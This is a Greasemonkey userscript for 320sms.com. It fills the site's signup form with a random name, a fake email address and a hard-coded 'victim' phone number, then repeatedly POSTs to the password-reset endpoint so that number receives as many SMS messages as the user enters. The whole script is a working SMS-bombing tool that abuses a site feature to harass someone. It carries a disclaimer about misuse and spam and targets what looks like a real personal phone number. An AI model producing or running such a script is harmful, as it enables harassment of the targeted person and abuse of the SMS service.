// ==UserScript==
// @name          320sms
// @namespace     nandu :P
// @include       http://*320sms.com/*
// ==/UserScript==


//I am not responsible for any misuse of this script..
// Dont spam, ur ip can be tracked by the site if the receiver complains

var name='';
var victim= "9019758851";

if(document.location=="http://www.320sms.com/index.php"||document.location=="http://320sms.com/index.php")
{
var chars = "abcdefghiklmnopqrstuvwxyz";
for (var i=0; i<10; i++) 
{
var rnum = Math.floor(Math.random() * chars.length);
name += chars.substring(rnum,rnum+1);
}
document.getElementById('textfield3').value=name;
document.getElementById('textfield4').value=name;
document.getElementById('textfield5').value=victim;
document.getElementById('textfield6').value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('select').value=Math.floor(Math.random()*29);
document.getElementById('select2').value='Jan';
document.getElementById('RadioGroup1_0').checked=true;
document.getElementById('select3').value='1986';
document.getElementsByName('stu').value="student";
document.getElementById('button2').click();void(0);
}


function sendSMS(no, n) {
    with(x = new XMLHttpRequest()) open("POST", "", false), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send("textfield=" + no);
    r = "Failed to send!";
    if (x.responseText.replace(/^\s+|\s+$/g, "") == "yes") r = "Sent to " + no + " #" + n + "!";
    return r;
}


if(document.location=="http://www.320sms.com/forgot.php"||document.location=="http://320sms.com/forgot.php")
{
document.getElementById('textfield').value=victim;
void(0);
var reply= prompt("enter the number of messages you want to send", "")

for(i=1;i<reply;i++)
sendSMS(victim, reply);

}



// if(document.location=='http://www.smsnow.in/'||document.location=='http://smsnow.in/')
// document.location='http://www.smsnow.in/forgotpassword.php';